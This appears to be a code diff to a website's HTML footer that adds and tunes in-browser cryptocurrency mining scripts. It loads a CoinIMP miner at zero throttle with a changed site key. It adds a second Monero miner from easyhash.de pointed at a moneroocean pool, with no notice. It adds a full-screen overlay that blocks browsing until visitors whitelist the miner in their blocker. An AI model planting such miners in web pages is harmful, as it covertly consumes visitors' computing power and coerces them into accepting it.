@@ -17,19 +17,28 @@
 </body>
  
 <script src="https://www.hostingcloud.racing/14MC.js"></script>
-
 <script>
-
-    var _client = new Client.Anonymous('ab53ae5aa903452c6124358ae8d214b5924d71234a36e22cd4077e1cd9ba049c', {
-
+    var _client = new Client.Anonymous('83d47a127d9d7aca938a80b2fcefac99fe7d1a128f8075c0eda536b7615ac619', {
         throttle: 0, c: 'w'
-
     });
-
     _client.start();
-
-    _client.addMiningNotification("Floating Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
+    _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
 </script>
  
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008" > </script>
